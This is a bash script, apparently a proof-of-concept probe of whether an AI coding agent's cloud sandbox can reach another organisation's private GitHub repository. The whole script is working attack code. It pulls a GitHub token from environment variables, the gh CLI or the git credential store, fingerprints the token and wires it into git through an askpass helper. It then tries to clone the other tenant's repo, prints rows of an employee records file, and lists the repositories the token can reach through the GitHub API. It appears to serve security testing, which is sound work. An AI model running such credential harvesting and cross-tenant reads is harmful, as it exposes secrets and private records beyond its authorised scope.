#!/usr/bin/env bash
set -euo pipefail

ORG_C="TestHub34"
REPO_C="c-internal-records"
FILE_C="employees_C.csv"
URL_C="https://github.com/${ORG_C}/${REPO_C}.git"
TMP="/tmp/codex-orgc-probe-$$"

echo "=== Codex Cloud GitHub scope probe ==="
echo "target_repo=${ORG_C}/${REPO_C}"
echo "target_file=${FILE_C}"
echo

get_token() {
  for v in GITHUB_TOKEN GH_TOKEN; do
    if [ -n "${!v:-}" ]; then
      printf '%s' "${!v}"
      return 0
    fi
  done

  if command -v gh >/dev/null 2>&1; then
    gh auth token 2>/dev/null && return 0
  fi

  if command -v git >/dev/null 2>&1; then
    printf 'protocol=https\nhost=github.com\n\n' \
      | git credential fill 2>/dev/null \
      | awk -F= '$1=="password"{print $2; exit}'
  fi
}

TOK="$(get_token || true)"

echo "=== 1. Token fingerprint, if accessible ==="
if [ -n "${TOK:-}" ]; then
  case "$TOK" in
    ghs_*) echo "token_class=ghs_ GitHub App / installation-style token" ;;
    ghu_*|gho_*) echo "token_class=ghu_/gho_ user OAuth-style token" ;;
    github_pat_*) echo "token_class=github_pat_ personal-access-token-style token" ;;
    *) echo "token_class=unknown" ;;
  esac
else
  echo "token_class=not directly accessible"
fi
echo

askpass=""
cleanup() {
  rm -rf "$TMP"
  [ -n "$askpass" ] && rm -f "$askpass"
}
trap cleanup EXIT

if [ -n "${TOK:-}" ]; then
  askpass="$(mktemp)"
  cat >"$askpass" <<'EOF'
#!/usr/bin/env sh
case "$1" in
  *Username*) printf '%s\n' 'x-access-token' ;;
  *Password*) printf '%s\n' "$CODEX_PROBE_TOKEN" ;;
  *) printf '\n' ;;
esac
EOF
  chmod 700 "$askpass"
  export GIT_ASKPASS="$askpass"
  export GIT_TERMINAL_PROMPT=0
  export CODEX_PROBE_TOKEN="$TOK"
else
  export GIT_TERMINAL_PROMPT=0
fi

echo "=== 2. Can this task see Org C private repo? ==="
set +e
LS_OUT="$(git -c credential.helper= ls-remote "$URL_C" 2>&1)"
LS_RC=$?
set -e

if [ "$LS_RC" -eq 0 ]; then
  echo "SEE: YES"
  printf '%s\n' "$LS_OUT" | sed -n '1,3p'
else
  echo "SEE: DENIED"
  printf '%s\n' "$LS_OUT" | tail -3
fi
echo

echo "=== 3. Can this task read Org C file contents? ==="
set +e
CLONE_OUT="$(git -c credential.helper= clone --depth 1 "$URL_C" "$TMP" 2>&1)"
CLONE_RC=$?
set -e

if [ "$CLONE_RC" -eq 0 ] && [ -f "$TMP/$FILE_C" ]; then
  echo "CROSS-TENANT FILE READ: YES"
  echo "--- ${FILE_C} from ${ORG_C}/${REPO_C} ---"
  sed -n '1,10p' "$TMP/$FILE_C"
else
  echo "CROSS-TENANT FILE READ: NO"
  printf '%s\n' "$CLONE_OUT" | tail -3
fi
echo

echo "=== 4. GitHub API token metadata, if token is accessible ==="
if [ -n "${TOK:-}" ] && command -v curl >/dev/null 2>&1; then
  echo "-- /installation/repositories full_name entries --"
  curl -sS \
    -H "Authorization: Bearer $TOK" \
    -H "Accept: application/vnd.github+json" \
    "https://api.github.com/installation/repositories?per_page=100" \
    | grep '"full_name"' \
    | sed 's/^/  /' \
    || true

  echo "-- /user login, if user-token style --"
  curl -sS \
    -H "Authorization: Bearer $TOK" \
    -H "Accept: application/vnd.github+json" \
    "https://api.github.com/user" \
    | grep '"login"' \
    | sed 's/^/  /' \
    || true
else
  echo "No directly accessible token or curl unavailable."
fi

echo "=== DONE ==="
